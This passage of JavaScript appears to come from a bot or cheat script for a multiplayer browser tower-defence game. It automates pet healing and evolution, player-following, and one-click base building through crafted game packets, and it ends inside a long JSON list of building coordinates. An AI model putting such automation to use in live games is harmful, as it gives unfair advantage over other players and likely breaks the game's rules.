                if (pet) {
                    this.bot.myPet = pet.targetTick;
                    if (this.bot.myPet) {
                        if (script.scripts.autopetheal.enabled) {
                            if ((this.bot.myPet.health/this.bot.myPet.maxHealth) * 100 < script.scripts.autopetheal.healSet && (this.bot.myPet.health/this.bot.myPet.maxHealth) * 100 > 0) {
                                if (!this.bot.healPet) {
                                    this.bot.sendPacket(9, {name: "BuyItem", itemName: "PetHealthPotion", tier: 1})
                                    this.bot.sendPacket(9, {name: "EquipItem", itemName: "PetHealthPotion", tier: 1})
                                    this.bot.healPet = true;
                                    setTimeout(() => {
                                        this.bot.healPet = false;
                                    }, 500);
                                }
                            }
                        }
                        if (evolvePetTiersAndExp[`${this.bot.myPet.tier}, ${detectPetLevelIfHigherReturnItsRequiredLevel(this.bot.myPet.tier, Math.floor(this.bot.myPet.experience / 100) + 1)}, ${detectPetTokenIfHigherReturnItsRequiredLevel(this.bot.myPet.tier, this.bot.myPlayer.token)}`]) {
                            if (!this.bot.EvolveOnceEverySecond) {
                                this.bot.EvolveOnceEverySecond = true;
                                setTimeout(() => {
                                    this.bot.EvolveOnceEverySecond = false;
                                }, 1000)
                                this.bot.sendPacket(9, {name: "BuyItem", itemName: this.bot.myPet.model, tier: this.bot.myPet.tier + 1});
                            }
                        }
                        if (script.model !== this.bot.myPet.model) this.bot.model = this.bot.myPet.model;
                        if (script.tier !== this.bot.myPet.tier) this.bot.tier = this.bot.myPet.tier;
                    }
                }
            }
        }
        if (script.scripts.autoRevivePets && this.bot.petActivated) {
            this.bot.sendPacket(9, {name: "BuyItem", itemName: "PetRevive", tier: 1});
            this.bot.sendPacket(9, {name: "EquipItem", itemName: "PetRevive", tier: 1});
        }
        this.bot.target = targets.sort((a, b) => {
            return measureDistance(myPos, a.position) - measureDistance(myPos, b.position);
        })[0];
        if (script.scripts.isallowedtofollow) this.mover(e, "name", this.bot.uidType);
        if (script.scripts.socketFollowMouse) {
            !script.scripts.wasd && this.moverbymouse(e, 0, {x: 0, y: 0}, true, true, reversedYaw);
        }
        if (script.scripts.socketRoundPlayer) {
            !script.scripts.wasd && this.moverbyrounds(e, 0, {x: 0, y: 0}, true, true, reversedYaw);
        }
    }
};
function build2ent() {
    function GetGoldStash() {
        for (let i in game.ui.buildings) {
            if (game.ui.buildings[i].type == "GoldStash") {
                return game.ui.buildings[i];
            }
        }
    }

    window.stash = GetGoldStash();

    if (window.stash) {
        let stashPosition = {
            x: window.stash.x,
            y: window.stash.y
        };

        let builder = JSON.parse(new2EntBase);
        for (let i in builder) {
            script.sendPacket(9, {name: "MakeBuilding", type: builder[i].type, x: builder[i].x + stashPosition.x, y: builder[i].y + stashPosition.y, yaw: 0});
        }
    }
}
function buildxbase() {
    function GetGoldStash() {
        for (let i in game.ui.buildings) {
            if (game.ui.buildings[i].type == "GoldStash") {
                return game.ui.buildings[i];
            }
        }
    }

    window.stash = GetGoldStash();

    if (window.stash) {
        let stashPosition = {
            x: window.stash.x,
            y: window.stash.y
        };

        let builder = JSON.parse(xBase);
        for (let i in builder) {
            script.sendPacket(9, {name: "MakeBuilding", type: builder[i].type, x: builder[i].x + stashPosition.x, y: builder[i].y + stashPosition.y, yaw: 0});
        }
    }
}
function buildplusbase() {
    function GetGoldStash() {
        for (let i in game.ui.buildings) {
            if (game.ui.buildings[i].type == "GoldStash") {
                return game.ui.buildings[i];
            }
        }
    }

    window.stash = GetGoldStash();

    if (window.stash) {
        let stashPosition = {
            x: window.stash.x,
            y: window.stash.y
        };

        let builder = JSON.parse(newPlusBase);
        for (let i in builder) {
            script.sendPacket(9, {name: "MakeBuilding", type: builder[i].type, x: builder[i].x + stashPosition.x, y: builder[i].y + stashPosition.y, yaw: 0});
        }
    }
}
function buildartr() {
    function GetGoldStash() {
        for (let i in game.ui.buildings) {
            if (game.ui.buildings[i].type == "GoldStash") {
                return game.ui.buildings[i];
            }
        }
    }

    window.stash = GetGoldStash();

    if (window.stash) {
        let stashPosition = {
            x: window.stash.x,
            y: window.stash.y
        };

        let builder = JSON.parse(antiRaidBaseTopRight);
        for (let i in builder) {
            script.sendPacket(9, {name: "MakeBuilding", type: builder[i].type, x: builder[i].x + stashPosition.x, y: builder[i].y + stashPosition.y, yaw: 0});
        }
    }
}
function buildartl() {
    function GetGoldStash() {
        for (let i in game.ui.buildings) {
            if (game.ui.buildings[i].type == "GoldStash") {
                return game.ui.buildings[i];
            }
        }
    }

    window.stash = GetGoldStash();

    if (window.stash) {
        let stashPosition = {
            x: window.stash.x,
            y: window.stash.y
        };

        let builder = JSON.parse(antiRaidBaseTopLeft);
        for (let i in builder) {
            script.sendPacket(9, {name: "MakeBuilding", type: builder[i].type, x: builder[i].x + stashPosition.x, y: builder[i].y + stashPosition.y, yaw: 0});
        }
    }
}
function buildarbr() {
    function GetGoldStash() {
        for (let i in game.ui.buildings) {
            if (game.ui.buildings[i].type == "GoldStash") {
                return game.ui.buildings[i];
            }
        }
    }

    window.stash = GetGoldStash();

    if (window.stash) {
        let stashPosition = {
            x: window.stash.x,
            y: window.stash.y
        };

        let builder = JSON.parse(antiRaidBaseBottomRight);
        for (let i in builder) {
            script.sendPacket(9, {name: "MakeBuilding", type: builder[i].type, x: builder[i].x + stashPosition.x, y: builder[i].y + stashPosition.y, yaw: 0});
        }
    }
}
function buildarbl() {
    function GetGoldStash() {
        for (let i in game.ui.buildings) {
            if (game.ui.buildings[i].type == "GoldStash") {
                return game.ui.buildings[i];
            }
        }
    }

    window.stash = GetGoldStash();

    if (window.stash) {
        let stashPosition = {
            x: window.stash.x,
            y: window.stash.y
        };

        let builder = JSON.parse(antiRaidBaseBottomLeft);
        for (let i in builder) {
            script.sendPacket(9, {name: "MakeBuilding", type: builder[i].type, x: builder[i].x + stashPosition.x, y: builder[i].y + stashPosition.y, yaw: 0});
        }
    }
}
function buildsb70m() {
    function GetGoldStash() {
        for (let i in game.ui.buildings) {
            if (game.ui.buildings[i].type == "GoldStash") {
                return game.ui.buildings[i];
            }
        }
    }

    window.stash = GetGoldStash();

    if (window.stash) {
        let stashPosition = {
            x: window.stash.x,
            y: window.stash.y
        };

        let builder = JSON.parse(scoreBase4PT70M);
        for (let i in builder) {
            script.sendPacket(9, {name: "MakeBuilding", type: builder[i].type, x: builder[i].x + stashPosition.x, y: builder[i].y + stashPosition.y, yaw: 0});
        }
    }
}
function buildsb40m() {
    function GetGoldStash() {
        for (let i in game.ui.buildings) {
            if (game.ui.buildings[i].type == "GoldStash") {
                return game.ui.buildings[i];
            }
        }
    }

    window.stash = GetGoldStash();

    if (window.stash) {
        let stashPosition = {
            x: window.stash.x,
            y: window.stash.y
        };

        let builder = JSON.parse(scoreBase4P40M);
        for (let i in builder) {
            script.sendPacket(9, {name: "MakeBuilding", type: builder[i].type, x: builder[i].x + stashPosition.x, y: builder[i].y + stashPosition.y, yaw: 0});
        }
    }
}
function buildsb80mb() {
    function GetGoldStash() {
        for (let i in game.ui.buildings) {
            if (game.ui.buildings[i].type == "GoldStash") {
                return game.ui.buildings[i];
            }
        }
    }

    window.stash = GetGoldStash();

    if (window.stash) {
        let stashPosition = {
            x: window.stash.x,
            y: window.stash.y
        };

        let builder = JSON.parse(scoreBase4PT80MBottom);
        for (let i in builder) {
            script.sendPacket(9, {name: "MakeBuilding", type: builder[i].type, x: builder[i].x + stashPosition.x, y: builder[i].y + stashPosition.y, yaw: 0});
        }
    }
}
function buildsb80mr() {
    function GetGoldStash() {
        for (let i in game.ui.buildings) {
            if (game.ui.buildings[i].type == "GoldStash") {
                return game.ui.buildings[i];
            }
        }
    }

    window.stash = GetGoldStash();

    if (window.stash) {
        let stashPosition = {
            x: window.stash.x,
            y: window.stash.y
        };

        let builder = JSON.parse(scoreBase4PT80MRight);
        for (let i in builder) {
            script.sendPacket(9, {name: "MakeBuilding", type: builder[i].type, x: builder[i].x + stashPosition.x, y: builder[i].y + stashPosition.y, yaw: 0});
        }
    }
}
function buildgb() {
    function GetGoldStash() {
        for (let i in game.ui.buildings) {
            if (game.ui.buildings[i].type == "GoldStash") {
                return game.ui.buildings[i];
            }
        }
    }

    window.stash = GetGoldStash();

    if (window.stash) {
        let stashPosition = {
            x: window.stash.x,
            y: window.stash.y
        };

        let builder = JSON.parse(goldBase);
        for (let i in builder) {
            script.sendPacket(9, {name: "MakeBuilding", type: builder[i].type, x: builder[i].x + stashPosition.x, y: builder[i].y + stashPosition.y, yaw: 0});
        }
    }
}
let new2EntBase = "{\"24435141\":{\"x\":-96,\"y\":-48,\"type\":\"BombTower\"},\"24435142\":{\"x\":-96,\"y\":48,\"type\":\"BombTower\"},\"24435143\":{\"x\":-96,\"y\":-144,\"type\":\"BombTower\"},\"24435144\":{\"x\":-96,\"y\":144,\"type\":\"ArrowTower\"},\"24435148\":{\"x\":24,\"y\":-120,\"type\":\"Wall\"},\"24435149\":{\"x\":24,\"y\":-72,\"type\":\"Wall\"},\"24435150\":{\"x\":-24,\"y\":-120,\"type\":\"SlowTrap\"},\"24435151\":{\"x\":-24,\"y\":-72,\"type\":\"SlowTrap\"},\"24435152\":{\"x\":24,\"y\":72,\"type\":\"Wall\"},\"24435153\":{\"x\":-24,\"y\":72,\"type\":\"Wall\"},\"24435154\":{\"x\":-24,\"y\":120,\"type\":\"Wall\"},\"24435155\":{\"x\":24,\"y\":120,\"type\":\"SlowTrap\"},\"24438004\":{\"x\":96,\"y\":144,\"type\":\"ArrowTower\"},\"24438005\":{\"x\":96,\"y\":48,\"type\":\"BombTower\"},\"24438006\":{\"x\":96,\"y\":-48,\"type\":\"BombTower\"},\"24438007\":{\"x\":96,\"y\":-144,\"type\":\"BombTower\"},\"24438016\":{\"x\":-192,\"y\":-96,\"type\":\"BombTower\"},\"24438017\":{\"x\":-288,\"y\":-144,\"type\":\"BombTower\"},\"24438018\":{\"x\":-288,\"y\":-48,\"type\":\"BombTower\"},\"24438019\":{\"x\":-288,\"y\":48,\"type\":\"BombTower\"},\"24438020\":{\"x\":-192,\"y\":96,\"type\":\"BombTower\"},\"24438021\":{\"x\":-288,\"y\":144,\"type\":\"BombTower\"},\"24438022\":{\"x\":192,\"y\":-96,\"type\":\"BombTower\"},\"24438023\":{\"x\":288,\"y\":-144,\"type\":\"BombTower\"},\"24438024\":{\"x\":288,\"y\":-48,\"type\":\"BombTower\"},\"24438025\":{\"x\":288,\"y\":48,\"type\":\"BombTower\"},\"24438026\":{\"x\":192,\"y\":96,\"type\":\"BombTower\"},\"24438027\":{\"x\":288,\"y\":144,\"type\":\"BombTower\"},\"24438028\":{\"x\":-96,\"y\":240,\"type\":\"ArrowTower\"},\"24438029\":{\"x\":-192,\"y\":288,\"type\":\"ArrowTower\"},\"24438030\":{\"x\":-288,\"y\":336,\"type\":\"ArrowTower\"},\"24438031\":{\"x\":-192,\"y\":384,\"type\":\"ArrowTower\"},\"24438033\":{\"x\":96,\"y\":240,\"type\":\"ArrowTower\"},\"24438034\":{\"x\":192,\"y\":288,\"type\":\"ArrowTower\"},\"24438035\":{\"x\":192,\"y\":384,\"type\":\"ArrowTower\"},\"24438036\":{\"x\":288,\"y\":336,\"type\":\"ArrowTower\"},\"24438037\":{\"x\":96,\"y\":336,\"type\":\"CannonTower\"},\"24438038\":{\"x\":-96,\"y\":336,\"type\":\"CannonTower\"},\"24438039\":{\"x\":96,\"y\":432,\"type\":\"MagicTower\"},\"24438040\":{\"x\":-96,\"y\":432,\"type\":\"MagicTower\"},\"24438041\":{\"x\":-192,\"y\":480,\"type\":\"MagicTower\"},\"24438042\":{\"x\":-288,\"y\":432,\"type\":\"MagicTower\"},\"24438043\":{\"x\":-384,\"y\":384,\"type\":\"MagicTower\"},\"24438044\":{\"x\":-480,\"y\":336,\"type\":\"MagicTower\"},\"24438053\":{\"x\":-576,\"y\":-96,\"type\":\"MagicTower\"},\"24438054\":{\"x\":-576,\"y\":96,\"type\":\"MagicTower\"},\"24438055\":{\"x\":-480,\"y\":-336,\"type\":\"MagicTower\"},\"24438056\":{\"x\":-384,\"y\":-384,\"type\":\"MagicTower\"},\"24438057\":{\"x\":-288,\"y\":-432,\"type\":\"MagicTower\"},\"24438058\":{\"x\":-192,\"y\":-480,\"type\":\"MagicTower\"},\"24438059\":{\"x\":-96,\"y\":-432,\"type\":\"MagicTower\"},\"24438060\":{\"x\":96,\"y\":-432,\"type\":\"MagicTower\"},\"24438061\":{\"x\":192,\"y\":-480,\"type\":\"MagicTower\"},\"24438062\":{\"x\":288,\"y\":-432,\"type\":\"MagicTower\"},\"24438063\":{\"x\":384,\"y\":-384,\"type\":\"MagicTower\"},\"24438064\":{\"x\":480,\"y\":-336,\"type\":\"MagicTower\"},\"24439474\":{\"x\":576,\"y\":-96,\"type\":\"MagicTower\"},\"24439635\":{\"x\":576,\"y\":96,\"type\":\"MagicTower\"},\"24440310\":{\"x\":576,\"y\":192,\"type\":\"CannonTower\"},\"24440399\":{\"x\":576,\"y\":0,\"type\":\"CannonTower\"},\"24440440\":{\"x\":576,\"y\":-192,\"type\":\"CannonTower\"},\"24441912\":{\"x\":-576,\"y\":-192,\"type\":\"CannonTower\"},\"24442718\":{\"x\":-576,\"y\":0,\"type\":\"CannonTower\"},\"24442719\":{\"x\":-576,\"y\":192,\"type\":\"CannonTower\"},\"24442776\":{\"x\":-480,\"y\":-240,\"type\":\"CannonTower\"},\"24442777\":{\"x\":-480,\"y\":-144,\"type\":\"CannonTower\"},\"24442778\":{\"x\":-384,\"y\":-288,\"type\":\"CannonTower\"},\"24442779\":{\"x\":-384,\"y\":-192,\"type\":\"CannonTower\"},\"24442780\":{\"x\":-288,\"y\":-336,\"type\":\"CannonTower\"},\"24442781\":{\"x\":-288,\"y\":-240,\"type\":\"CannonTower\"},\"24442782\":{\"x\":-192,\"y\":-384,\"type\":\"CannonTower\"},\"24442783\":{\"x\":-192,\"y\":-288,\"type\":\"CannonTower\"},\"24442784\":{\"x\":-96,\"y\":-336,\"type\":\"CannonTower\"},\"24442785\":{\"x\":96,\"y\":-336,\"type\":\"CannonTower\"},\"24442786\":{\"x\":192,\"y\":-384,\"type\":\"CannonTower\"},\"24442787\":{\"x\":192,\"y\":-288,\"type\":\"CannonTower\"},\"24442788\":{\"x\":288,\"y\":-336,\"type\":\"CannonTower\"},\"24442789\":{\"x\":384,\"y\":-288,\"type\":\"CannonTower\"},\"24442790\":{\"x\":480,\"y\":-240,\"type\":\"CannonTower\"},\"24442791\":{\"x\":96,\"y\":-240,\"type\":\"ArrowTower\"},\"24442792\":{\"x\":192,\"y\":-192,\"type\":\"ArrowTower\"},\"24442793\":{\"x\":288,\"y\":-240,\"type\":\"ArrowTower\"},\"24442794\":{\"x\":384,\"y\":-192,\"type\":\"ArrowTower\"},\"24442795\":{\"x\":480,\"y\":-144,\"type\":\"ArrowTower\"},\"24442796\":{\"x\":480,\"y\":-48,\"type\":\"ArrowTower\"},\"24442797\":{\"x\":480,\"y\":48,\"type\":\"ArrowTower\"},\"24442798\":{\"x\":480,\"y\":144,\"type\":\"ArrowTower\"},\"24442799\":{\"x\":480,\"y\":240,\"type\":\"ArrowTower\"},\"24442800\":{\"x\":480,\"y\":336,\"type\":\"MagicTower\"},\"24442801\":{\"x\":384,\"y\":384,\"type\":\"MagicTower\"},\"24442802\":{\"x\":288,\"y\":432,\"type\":\"MagicTower\"},\"24442803\":{\"x\":192,\"y\":480,\"type\":\"MagicTower\"},\"24442804\":{\"x\":384,\"y\":288,\"type\":\"GoldMine\"},\"24442805\":{\"x\":288,\"y\":240,\"type\":\"GoldMine\"},\"24442806\":{\"x\":192,\"y\":192,\"type\":\"GoldMine\"},\"24442807\":{\"x\":384,\"y\":192,\"type\":\"GoldMine\"},\"24442808\":{\"x\":-192,\"y\":192,\"type\":\"GoldMine\"},\"24442809\":{\"x\":-288,\"y\":240,\"type\":\"GoldMine\"},\"24442810\":{\"x\":-384,\"y\":288,\"type\":\"GoldMine\"},\"24442811\":{\"x\":-384,\"y\":192,\"type\":\"GoldMine\"},\"24442812\":{\"x\":-384,\"y\":-96,\"type\":\"BombTower\"},\"24442813\":{\"x\":-384,\"y\":0,\"type\":\"BombTower\"},\"24442814\":{\"x\":-384,\"y\":96,\"type\":\"BombTower\"},\"24442817\":{\"x\":384,\"y\":-96,\"type\":\"BombTower\"},\"24442818\":{\"x\":384,\"y\":0,\"type\":\"BombTower\"},\"24442819\":{\"x\":-480,\"y\":240,\"type\":\"CannonTower\"},\"24442820\":{\"x\":-480,\"y\":144,\"type\":\"ArrowTower\"},\"24442821\":{\"x\":-480,\"y\":48,\"type\":\"ArrowTower\"},\"24442822\":{\"x\":-480,\"y\":-48,\"type\":\"ArrowTower\"},\"24442823\":{\"x\":-96,\"y\":-240,\"type\":\"ArrowTower\"},\"24442824\":{\"x\":-192,\"y\":-192,\"type\":\"ArrowTower\"},\"24442825\":{\"x\":384,\"y\":96,\"type\":\"BombTower\"},\"24442826\":{\"x\":0,\"y\":-192,\"type\":\"Harvester\"},\"24442827\":{\"x\":0,\"y\":-288,\"type\":\"Harvester\"},\"24442828\":{\"x\":0,\"y\":-384,\"type\":\"Harvester\"},\"24442829\":{\"x\":0,\"y\":-480,\"type\":\"Harvester\"},\"24442830\":{\"x\":0,\"y\":192,\"type\":\"Harvester\"},\"24442831\":{\"x\":0,\"y\":288,\"type\":\"Harvester\"},\"24442832\":{\"x\":0,\"y\":384,\"type\":\"Harvester\"},\"24442833\":{\"x\":0,\"y\":480,\"type\":\"Harvester\"},\"24444320\":{\"x\":120,\"y\":504,\"type\":\"Wall\"},\"24444461\":{\"x\":-120,\"y\":504,\"type\":\"Wall\"},\"24444586\":{\"x\":264,\"y\":504,\"type\":\"Wall\"},\"24445745\":{\"x\":-264,\"y\":504,\"type\":\"Wall\"},\"24445934\":{\"x\":-360,\"y\":456,\"type\":\"Wall\"},\"24446014\":{\"x\":-456,\"y\":408,\"type\":\"Wall\"},\"24446132\":{\"x\":-552,\"y\":264,\"type\":\"Wall\"},\"24446545\":{\"x\":-552,\"y\":312,\"type\":\"Wall\"},\"24447078\":{\"x\":-648,\"y\":120,\"type\":\"Wall\"},\"24447102\":{\"x\":-648,\"y\":72,\"type\":\"Wall\"},\"24447103\":{\"x\":-648,\"y\":24,\"type\":\"Wall\"},\"24447114\":{\"x\":-648,\"y\":-24,\"type\":\"Wall\"},\"24447120\":{\"x\":-648,\"y\":-72,\"type\":\"Wall\"},\"24447145\":{\"x\":-648,\"y\":-120,\"type\":\"Wall\"},\"24447846\":{\"x\":-552,\"y\":-264,\"type\":\"Wall\"},\"24447884\":{\"x\":-552,\"y\":-312,\"type\":\"Wall\"},\"24448125\":{\"x\":-456,\"y\":-408,\"type\":\"Wall\"},\"24448307\":{\"x\":-360,\"y\":-456,\"type\":\"Wall\"},\"24448622\":{\"x\":-264,\"y\":-504,\"type\":\"Wall\"},\"24448875\":{\"x\":-120,\"y\":-504,\"type\":\"Wall\"},\"24449411\":{\"x\":120,\"y\":-504,\"type\":\"Wall\"},\"24449798\":{\"x\":264,\"y\":-504,\"type\":\"Wall\"},\"24449829\":{\"x\":360,\"y\":-456,\"type\":\"Wall\"},\"24449849\":{\"x\":456,\"y\":-408,\"type\":\"Wall\"},\"24449856\":{\"x\":552,\"y\":-312,\"type\":\"Wall\"},\"24449857\":{\"x\":552,\"y\":-264,\"type\":\"Wall\"},\"24449858\":{\"x\":648,\"y\":-120,\"type\":\"Wall\"},\"24449859\":{\"x\":648,\"y\":-72,\"type\":\"Wall\"},\"24449860\":{\"x\":648,\"y\":-24,\"type\":\"Wall\"},\"24449861\":{\"x\":648,\"y\":24,\"type\":\"Wall\"},\"24449862\":{\"x\":648,\"y\":72,\"type\":\"Wall\"},\"24449863\":{\"x\":648,\"y\":120,\"type\":\"Wall\"},\"24449864\":{\"x\":552,\"y\":264,\"type\":\"Wall\"},\"24449865\":{\"x\":552,\"y\":312,\"type\":\"Wall\"},\"24449866\":{\"x\":456,\"y\":408,\"type\":\"Wall\"},\"24449867\":{\"x\":360,\"y\":456,\"type\":\"Wall\"},\"24449868\":{\"x\":-72,\"y\":504,\"type\":\"Door\"},\"24449869\":{\"x\":-72,\"y\":552,\"type\":\"Door\"},\"24449870\":{\"x\":-120,\"y\":552,\"type\":\"Door\"},\"24449871\":{\"x\":-24,\"y\":552,\"type\":\"Door\"},\"24449873\":{\"x\":24,\"y\":552,\"type\":\"SlowTrap\"},\"24449874\":{\"x\":72,\"y\":504,\"type\":\"Door\"},\"24449875\":{\"x\":72,\"y\":552,\"type\":\"Door\"},\"24449876\":{\"x\":120,\"y\":552,\"type\":\"Door\"},\"24449877\":{\"x\":168,\"y\":552,\"type\":\"Door\"},\"24449878\":{\"x\":216,\"y\":552,\"type\":\"Door\"},\"24449879\":{\"x\":264,\"y\":552,\"type\":\"Door\"},\"24449880\":{\"x\":312,\"y\":552,\"type\":\"Door\"},\"24449881\":{\"x\":312,\"y\":600,\"type\":\"Door\"},\"24449882\":{\"x\":264,\"y\":600,\"type\":\"Door\"},\"24449883\":{\"x\":216,\"y\":600,\"type\":\"Door\"},\"24449884\":{\"x\":168,\"y\":600,\"type\":\"Door\"},\"24449885\":{\"x\":-168,\"y\":552,\"type\":\"Door\"},\"24449886\":{\"x\":-216,\"y\":552,\"type\":\"Door\"},\"24449887\":{\"x\":-264,\"y\":552,\"type\":\"Door\"},\"24449888\":{\"x\":-312,\"y\":552,\"type\":\"Door\"},\"24449889\":{\"x\":-312,\"y\":600,\"type\":\"Door\"},\"24449890\":{\"x\":-264,\"y\":600,\"type\":\"Door\"},\"24449891\":{\"x\":-216,\"y\":600,\"type\":\"Door\"},\"24449892\":{\"x\":-168,\"y\":600,\"type\":\"Door\"},\"24449893\":{\"x\":360,\"y\":552,\"type\":\"Door\"},\"24449894\":{\"x\":408,\"y\":552,\"type\":\"Door\"},\"24449895\":{\"x\":456,\"y\":504,\"type\":\"Door\"},\"24449896\":{\"x\":504,\"y\":504,\"type\":\"Door\"},\"24449897\":{\"x\":552,\"y\":456,\"type\":\"Door\"},\"24449898\":{\"x\":600,\"y\":408,\"type\":\"Door\"},\"24449900\":{\"x\":648,\"y\":264,\"type\":\"Door\"},\"24449901\":{\"x\":648,\"y\":312,\"type\":\"Door\"},\"24449902\":{\"x\":600,\"y\":360,\"type\":\"Door\"},\"24449903\":{\"x\":552,\"y\":360,\"type\":\"Door\"},\"24449904\":{\"x\":600,\"y\":264,\"type\":\"Door\"},\"24449905\":{\"x\":600,\"y\":312,\"type\":\"Door\"},\"24449906\":{\"x\":552,\"y\":408,\"type\":\"Door\"},\"24449907\":{\"x\":504,\"y\":408,\"type\":\"Door\"},\"24449908\":{\"x\":456,\"y\":456,\"type\":\"Door\"},\"24449909\":{\"x\":408,\"y\":456,\"type\":\"Door\"},\"24449910\":{\"x\":408,\"y\":504,\"type\":\"Door\"},\"24449911\":{\"x\":360,\"y\":504,\"type\":\"Door\"},\"24449912\":{\"x\":312,\"y\":504,\"type\":\"Door\"},\"24449913\":{\"x\":504,\"y\":456,\"type\":\"Door\"},\"24449914\":{\"x\":648,\"y\":168,\"type\":\"Door\"},\"24449915\":{\"x\":696,\"y\":168,\"type\":\"Door\"},\"24449916\":{\"x\":696,\"y\":216,\"type\":\"Door\"},\"24449917\":{\"x\":648,\"y\":216,\"type\":\"Door\"},\"24449918\":{\"x\":696,\"y\":120,\"type\":\"Door\"},\"24449919\":{\"x\":696,\"y\":72,\"type\":\"Door\"},\"24449920\":{\"x\":696,\"y\":-72,\"type\":\"Door\"},\"24449921\":{\"x\":696,\"y\":-120,\"type\":\"Door\"},\"24449922\":{\"x\":696,\"y\":-168,\"type\":\"Door\"},\"24449923\":{\"x\":648,\"y\":-168,\"type\":\"Door\"},\"24449924\":{\"x\":648,\"y\":-216,\"type\":\"Door\"},\"24449925\":{\"x\":696,\"y\":-216,\"type\":\"Door\"},\"24449926\":{\"x\":696,\"y\":-24,\"type\":\"Door\"},\"24449927\":{\"x\":696,\"y\":24,\"type\":\"Door\"},\"24449928\":{\"x\":552,\"y\":-360,\"type\":\"Door\"},\"24449929\":{\"x\":600,\"y\":-360,\"type\":\"Door\"},\"24449930\":{\"x\":600,\"y\":-312,\"type\":\"Door\"},\"24449931\":{\"x\":600,\"y\":-264,\"type\":\"Door\"},\"24449932\":{\"x\":648,\"y\":-264,\"type\":\"Door\"},\"24449933\":{\"x\":648,\"y\":-312,\"type\":\"Door\"},\"24449934\":{\"x\":120,\"y\":-552,\"type\":\"Door\"},\"24449935\":{\"x\":72,\"y\":-552,\"type\":\"Door\"},\"24449936\":{\"x\":72,\"y\":-504,\"type\":\"Door\"},\"24449937\":{\"x\":168,\"y\":-600,\"type\":\"Door\"},\"24449938\":{\"x\":216,\"y\":-600,\"type\":\"Door\"},\"24449939\":{\"x\":264,\"y\":-600,\"type\":\"Door\"},\"24449940\":{\"x\":312,\"y\":-600,\"type\":\"Door\"},\"24449941\":{\"x\":312,\"y\":-552,\"type\":\"Door\"},\"24449942\":{\"x\":264,\"y\":-552,\"type\":\"Door\"},\"24449943\":{\"x\":216,\"y\":-552,\"type\":\"Door\"},\"24449944\":{\"x\":168,\"y\":-552,\"type\":\"Door\"},\"24449945\":{\"x\":552,\"y\":-408,\"type\":\"Door\"},\"24449946\":{\"x\":504,\"y\":-408,\"type\":\"Door\"},\"24449947\":{\"x\":504,\"y\":-456,\"type\":\"Door\"},\"24449948\":{\"x\":456,\"y\":-456,\"type\":\"Door\"},\"24449949\":{\"x\":456,\"y\":-504,\"type\":\"Door\"},\"24449950\":{\"x\":504,\"y\":-504,\"type\":\"Door\"},\"24449951\":{\"x\":552,\"y\":-456,\"type\":\"Door\"},\"24449952\":{\"x\":408,\"y\":-456,\"type\":\"Door\"},\"24449953\":{\"x\":408,\"y\":-504,\"type\":\"Door\"},\"24449954\":{\"x\":408,\"y\":-552,\"type\":\"Door\"},\"24449955\":{\"x\":360,\"y\":-552,\"type\":\"Door\"},\"24449975\":{\"x\":360,\"y\":-504,\"type\":\"Door\"},\"24449976\":{\"x\":312,\"y\":-504,\"type\":\"Door\"},\"24450533\":{\"x\":-24,\"y\":-552,\"type\":\"SlowTrap\"},\"24450631\":{\"x\":24,\"y\":-552,\"type\":\"Door\"},\"24451086\":{\"x\":-120,\"y\":-552,\"type\":\"Door\"},\"24451092\":{\"x\":-72,\"y\":-552,\"type\":\"Door\"},\"24451099\":{\"x\":-72,\"y\":-504,\"type\":\"Door\"},\"24451217\":{\"x\":-168,\"y\":-552,\"type\":\"Door\"},\"24451290\":{\"x\":-168,\"y\":-600,\"type\":\"Door\"},\"24451375\":{\"x\":-216,\"y\":-600,\"type\":\"Door\"},\"24451411\":{\"x\":-264,\"y\":-600,\"type\":\"Door\"},\"24451456\":{\"x\":-312,\"y\":-600,\"type\":\"Door\"},\"24451494\":{\"x\":-312,\"y\":-552,\"type\":\"Door\"},\"24451527\":{\"x\":-264,\"y\":-552,\"type\":\"Door\"},\"24451560\":{\"x\":-216,\"y\":-552,\"type\":\"Door\"},\"24452811\":{\"x\":-648,\"y\":-216,\"type\":\"Door\"},\"24452825\":{\"x\":-696,\"y\":-216,\"type\":\"Door\"},\"24452858\":{\"x\":-696,\"y\":-168,\"type\":\"Door\"},\"24452881\":{\"x\":-696,\"y\":-120,\"type\":\"Door\"},\"24452910\":{\"x\":-696,\"y\":-72,\"type\":\"Door\"},\"24452926\":{\"x\":-696,\"y\":-24,\"type\":\"Door\"},\"24452958\":{\"x\":-696,\"y\":24,\"type\":\"Door\"},\"24452959\":{\"x\":-696,\"y\":72,\"type\":\"Door\"},\"24453001\":{\"x\":-696,\"y\":120,\"type\":\"Door\"},\"24453006\":{\"x\":-696,\"y\":168,\"type\":\"Door\"},\"24453023\":{\"x\":-696,\"y\":216,\"type\":\"Door\"},\"24453117\":{\"x\":-648,\"y\":216,\"type\":\"Door\"},\"24453142\":{\"x\":-648,\"y\":168,\"type\":\"Door\"},\"24453234\":{\"x\":-648,\"y\":-168,\"type\":\"Door\"},\"24454101\":{\"x\":-648,\"y\":-264,\"type\":\"Door\"},\"24454154\":{\"x\":-600,\"y\":-264,\"type\":\"Door\"},\"24454175\":{\"x\":-600,\"y\":-312,\"type\":\"Door\"},\"24454289\":{\"x\":-600,\"y\":-360,\"type\":\"Door\"},\"24454325\":{\"x\":-552,\"y\":-360,\"type\":\"Door\"},\"24454427\":{\"x\":-648,\"y\":-312,\"type\":\"Door\"},\"24457138\":{\"x\":-360,\"y\":-552,\"type\":\"Door\"},\"24457174\":{\"x\":-408,\"y\":-552,\"type\":\"Door\"},\"24457274\":{\"x\":-456,\"y\":-504,\"type\":\"Door\"},\"24457306\":{\"x\":-504,\"y\":-504,\"type\":\"Door\"},\"24457328\":{\"x\":-552,\"y\":-456,\"type\":\"Door\"},\"24457354\":{\"x\":-552,\"y\":-408,\"type\":\"Door\"},\"24457368\":{\"x\":-504,\"y\":-408,\"type\":\"Door\"},\"24457376\":{\"x\":-456,\"y\":-456,\"type\":\"Door\"},\"24457383\":{\"x\":-408,\"y\":-504,\"type\":\"Door\"},\"24457391\":{\"x\":-360,\"y\":-504,\"type\":\"Door\"},\"24457400\":{\"x\":-312,\"y\":-504,\"type\":\"Door\"},\"24457429\":{\"x\":-408,\"y\":-456,\"type\":\"Door\"},\"24457455\":{\"x\":-504,\"y\":-456,\"type\":\"Door\"},\"24457748\":{\"x\":-648,\"y\":264,\"type\":\"Door\"},\"24457749\":{\"x\":-600,\"y\":264,\"type\":\"Door\"},\"24457750\":{\"x\":-600,\"y\":312,\"type\":\"Door\"},\"24457751\":{\"x\":-648,\"y\":312,\"type\":\"Door\"},\"24457752\":{\"x\":-600,\"y\":360,\"type\":\"Door\"},\"24457753\":{\"x\":-552,\"y\":360,\"type\":\"Door\"},\